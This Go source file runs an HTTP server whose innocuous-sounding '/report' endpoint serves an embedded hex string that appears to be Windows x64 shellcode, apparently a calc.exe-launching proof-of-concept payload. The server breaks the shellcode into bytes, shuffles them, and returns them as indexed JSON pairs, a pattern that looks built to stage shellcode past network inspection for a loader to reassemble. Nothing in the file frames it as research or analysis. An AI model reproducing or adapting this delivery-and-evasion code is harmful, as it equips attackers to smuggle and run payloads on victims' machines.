package main

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"strconv"
	"time"
)

var hexString = "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500"

func main() {
	http.HandleFunc("/report", handleReport)
	http.ListenAndServe(":8080", nil)
}

func handleReport(w http.ResponseWriter, r *http.Request) {
	byteMap := make(map[int]string)
	for i := 0; i < len(hexString); i += 2 {
		byteMap[i/2] = hexString[i : i+2]
	}

	keys := make([]int, 0, len(byteMap))
	for k := range byteMap {
		keys = append(keys, k)
	}

	// Shuffle the keys
	seed := time.Now().UnixNano()
	rand.Seed(seed)
	rand.Shuffle(len(keys), func(i, j int) { keys[i], keys[j] = keys[j], keys[i] })

	fmt.Printf("Shuffled keys: %v\n", keys)

	type KeyValue struct {
		Key   string `json:"key"`
		Value string `json:"value"`
	}

	var keyValuePairs []KeyValue
	for _, k := range keys {
		keyValuePairs = append(keyValuePairs, KeyValue{
			Key:   strconv.Itoa(k),
			Value: byteMap[k],
		})
	}

	response := struct {
		Report []KeyValue `json:"report"`
	}{
		Report: keyValuePairs,
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}
